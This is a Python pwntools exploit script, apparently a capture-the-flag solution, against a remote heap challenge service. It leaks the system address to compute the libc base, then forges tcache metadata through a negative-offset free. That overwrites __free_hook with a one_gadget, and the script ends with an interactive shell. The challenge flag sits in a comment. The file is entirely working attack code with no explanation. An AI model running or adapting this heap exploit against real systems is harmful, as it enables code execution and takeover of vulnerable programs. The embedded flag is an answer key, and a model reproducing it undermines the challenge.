#!/usr/bin/env python
# coding: utf-8

from pwn import *

# flag{eazy_tc4che_forg3ry}

local = False

if local:
	p = process('./launch.sh')
else:
	p = remote('arcade.fluxfingers.net', 1815)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_remote = {
	'base': 0x0,
	'system': 0x45380,
	'free_hook': 0x1c0748,
	'one_gadget': 0xe75f0
}

libc = libc_remote

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

def malloc(sz):
	ru('bye!\n')
	sel('1')
	ru('much?\n')
	sel(str(sz))


def edit(payload):
	ru('bye!\n')
	sel('3')
	ru('what?\n')
	se(payload)


def free(off):
	ru('bye!\n')
	sel('2')
	ru('where?\n')
	sel(str(off))

ru('system : 0x')
system = int(rud('\n'), 16)
print('[+] system @ %#x' % system)
set_base(libc, 'system', system)

malloc(0x400 - 5*0x10 - 8)
free(0)
free(-0x210)
malloc(0x100 - 8)
edit(p64(libc['free_hook']))
malloc(0x20 - 8)
edit(p64(libc['one_gadget']))
free(0)

p.interactive()
